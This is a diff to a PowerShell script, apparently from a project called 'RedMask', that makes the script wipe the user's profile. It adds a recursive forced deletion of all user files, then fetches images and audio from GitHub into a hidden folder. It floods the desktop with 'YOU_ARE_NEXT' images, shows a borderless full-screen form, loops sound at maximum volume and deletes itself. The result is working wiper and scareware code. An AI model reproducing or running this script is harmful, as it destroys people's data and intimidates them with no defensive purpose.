@@ -1,4 +1,12 @@
+# Delete all user files except GUI files
+Get-ChildItem -Path $env:USERPROFILE\* -Recurse -exclude $env:USERPROFILE\temp* |
+Select -ExpandProperty FullName |
+Where {$_ -notlike '$env:USERPROFILE\temp\*'} |
+sort length -Descending |
+Remove-Item -r -force 
+
 # Download necessary files to super hidden folder
+mkdir $env:USERPROFILE\temp
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/wallpaper.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/form.png" -outfile "$env:USERPROFILE\temp\f.png"
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/sound.wav" -outfile "$env:USERPROFILE\temp\s.wav"
@@ -16,11 +24,7 @@ cp $env:USERPROFILE\Desktop\YOU_ARE_NEXT.png $env:USERPROFILE\Desktop\YOU_ARE_NE
 $f++
 }
 
-# Set max volume
-Set-SpeakerVolume -Max
-$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
-$player.PlayLooping();
-
+# Define max volume
 Function Set-SpeakerVolume
 
 { Param (
@@ -52,6 +56,12 @@ $Form.ShowInTaskbar = $False
 $Form.FormBorderStyle = 'None'
 $Form.MaximizeBox = $False
 $Form.Show();
+
+# Play audio at max volume
+Set-SpeakerVolume -Max
+$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
+$player.PlayLooping();
+
 
 # Remove script
 Remove-Item -Path $MyInvocation.MyCommand.Source
